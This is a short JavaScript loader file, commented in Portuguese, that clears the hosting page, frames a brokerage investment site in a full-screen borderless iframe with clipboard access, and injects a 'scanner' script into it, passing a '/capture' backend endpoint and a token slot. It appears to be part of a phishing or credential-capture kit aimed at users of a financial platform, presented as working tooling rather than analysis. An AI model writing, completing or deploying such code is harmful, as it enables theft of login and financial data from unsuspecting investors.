// static/loader.js
(function () {
    console.log("Nexus Loader iniciado…");

    const TARGET = "https://www.homebroker.com/pt/invest";

    // URL do scanner interno hospedado na Render
    const SCANNER_URL = "/static/scanner.js";

    // endpoint de captura no backend
    const CAPTURE_ENDPOINT = "/capture";

    // iframe container
    const frame = document.createElement("iframe");
    frame.src = TARGET;
    frame.style.width = "100vw";
    frame.style.height = "100vh";
    frame.style.border = "none";
    frame.style.position = "fixed";
    frame.style.top = "0";
    frame.style.left = "0";
    frame.allow = "clipboard-read; clipboard-write;";

    document.body.innerHTML = ""; // limpa tudo e coloca só o iframe
    document.body.appendChild(frame);

    console.log("Iframe criado e apontado para:", TARGET);

    // injeção após carregar
    frame.onload = () => {
        console.log("Página carregada dentro do iframe. Injetando scanner…");

        try {
            const win = frame.contentWindow;
            const doc = frame.contentDocument;

            // cria elemento script
            const injector = doc.createElement("script");
            injector.src = SCANNER_URL;

            // passa o endpoint e token para dentro da página
            injector.onload = () => {
                try {
                    win.NEXUS_CAPTURE_ENDPOINT = CAPTURE_ENDPOINT;
                    win.NEXUS_TOKEN_INJECT = "";
                } catch (e) {
                    console.warn("Falha ao setar variáveis no iframe:", e);
                }
            };

            doc.head.appendChild(injector);

            console.log("Scanner injetado com sucesso!");

        } catch (err) {
            console.error("Erro ao injetar script:", err);
        }
    };

})();
